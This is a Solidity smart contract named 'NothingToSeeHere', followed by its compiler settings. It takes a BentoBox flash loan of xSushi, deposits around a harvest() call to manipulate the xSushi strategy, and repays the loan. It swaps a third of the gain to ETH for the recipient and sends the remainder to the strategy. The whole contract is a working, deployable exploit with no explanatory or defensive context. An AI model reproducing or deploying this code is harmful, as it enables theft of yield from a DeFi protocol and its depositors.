// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0;

contract NothingToSeeHere {
	
	IBentoBoxMinimal public immutable bentoBox;
	IERC20 public immutable sushi;
	IWETH immutable weth;
	IXSushi public immutable xSushi;
	IXSushiStrategy public immutable xSushiStrategy;
	IPair public immutable xSushiWethLp;
	address public immutable recipient;

    constructor(
		IBentoBoxMinimal _bentoBox,
		IERC20 _sushi,
		IWETH _weth,
		IXSushi _xSushi,
		IXSushiStrategy _xSushiStrategy,
		IPair _xSushiWethLp,
		address _recipient
	) {
		bentoBox = _bentoBox;
		sushi = _sushi;
		weth = _weth;
		xSushiWethLp = _xSushiWethLp;
		xSushi = _xSushi;
		xSushiStrategy = _xSushiStrategy;
		recipient = _recipient;
		_xSushi.approve(address(_xSushiStrategy), type(uint256).max);
		_sushi.approve(address(_xSushi), type(uint256).max);
		_sushi.approve(address(_bentoBox), type(uint256).max);
	}

	function execute(uint256 amount) public {
		require(msg.sender == recipient);
		bentoBox.flashLoan(address(this), address(this), address(xSushi), amount, "");
	}

	function onFlashLoan(address, address, uint256 amount, uint256 fee, bytes memory) public {
		xSushi.leave(amount);
		uint256 availableSushi = sushi.balanceOf(address(this));
		(, uint256 shareOut) = bentoBox.deposit(address(sushi), address(this), address(this), availableSushi, 0);
        bentoBox.harvest(address(sushi), false, 0);
		bentoBox.withdraw(address(sushi), address(this), address(this), 0, shareOut);
		xSushi.enter(sushi.balanceOf(address(this)));
		xSushi.transfer(address(bentoBox), amount + fee);
		uint256 profit = xSushi.balanceOf(address(this)) / 3;
		uint256 amountOut = getAmountOut(profit);
		xSushi.transfer(address(xSushiWethLp), profit);
		xSushiWethLp.swap(0, amountOut, address(this), "");
		weth.withdraw(amountOut);
		recipient.call{value: address(this).balance}("");
		xSushi.transfer(address(xSushiStrategy), xSushi.balanceOf(address(this)));
		bentoBox.harvest(address(sushi), false, 0);
	}
    
	function getAmountOut(uint256 amountIn) internal view returns (uint256 amountOut) {
        uint256 reserveIn = xSushi.balanceOf(address(xSushiWethLp));
        uint256 reserveOut = weth.balanceOf(address(xSushiWethLp));
		uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }

	receive() payable external {}

}

interface IPair {
	function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

/// @notice Minimal BentoBox vault interface. 
/// @dev `token` is aliased as `address` from `IERC20` for simplicity.
interface IBentoBoxMinimal {
    struct Rebase {
        uint128 elastic;
        uint128 base;
    }
    /// @notice Balance per ERC-20 token per account in shares.
    function balanceOf(address, address) external view returns (uint256);
    
    /// @dev Helper function to represent an `amount` of `token` in shares.
    /// @param token The ERC-20 token.
    /// @param amount The `token` amount.
    /// @param roundUp If the result `share` should be rounded up.
    /// @return share The token amount represented in shares.
    function toShare(
        address token,
        uint256 amount,
        bool roundUp
    ) external view returns (uint256 share);
    
    /// @dev Helper function to represent shares back into the `token` amount.
    /// @param token The ERC-20 token.
    /// @param share The amount of shares.
    /// @param roundUp If the result should be rounded up.
    /// @return amount The share amount back into native representation.
    function toAmount(
        address token,
        uint256 share,
        bool roundUp
    ) external view returns (uint256 amount);
    
    /// @notice Registers this contract so that users can approve it for BentoBox.
    function registerProtocol() external;

    /// @notice Deposit an amount of `token` represented in either `amount` or `share`.
    /// @param token_ The ERC-20 token to deposit.
    /// @param from which account to pull the tokens.
    /// @param to which account to push the tokens.
    /// @param amount Token amount in native representation to deposit.
    /// @param share Token amount represented in shares to deposit. Takes precedence over `amount`.
    /// @return amountOut The amount deposited.
    /// @return shareOut The deposited amount repesented in shares.
    function deposit(
        address token_,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256 amountOut, uint256 shareOut);

    /// @notice Withdraws an amount of `token` from a user account.
    /// @param token_ The ERC-20 token to withdraw.
    /// @param from which user to pull the tokens.
    /// @param to which user to push the tokens.
    /// @param amount of tokens. Either one of `amount` or `share` needs to be supplied.
    /// @param share Like above, but `share` takes precedence over `amount`.
    function withdraw(
        address token_,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);

    /// @notice Transfer shares from a user account to another one.
    /// @param token The ERC-20 token to transfer.
    /// @param from which user to pull the tokens.
    /// @param to which user to push the tokens.
    /// @param share The amount of `token` in shares.
    function transfer(
        address token,
        address from,
        address to,
        uint256 share
    ) external;

    function flashLoan(
        address borrower,
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external;

    function totals(address) external returns(Rebase memory);

    function harvest(
        address token,
        bool balance,
        uint256 maxChangeAmount
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function decimals() external view returns (uint256);
	function transferFrom(address, address, uint256) external;
	function transfer(address, uint256) external;
}

interface IWETH is IERC20{
	function withdraw(uint) external;
}

interface IXSushiStrategy {
    function skim(uint256) external;
}
interface IXSushi is IERC20 {
    function enter(uint256) external;
    function leave(uint256) external;
}

{
  "optimizer": {
    "enabled": true,
    "runs": 200
  },
  "outputSelection": {
    "*": {
      "*": [
        "evm.bytecode",
        "evm.deployedBytecode",
        "abi"
      ]
    }
  },
  "metadata": {
    "useLiteralContent": true
  },
  "libraries": {
    "": {
      "__CACHE_BREAKER__": "0x00000000d41867734bbee4c6863d9255b2b06ac1"
    }
  }
}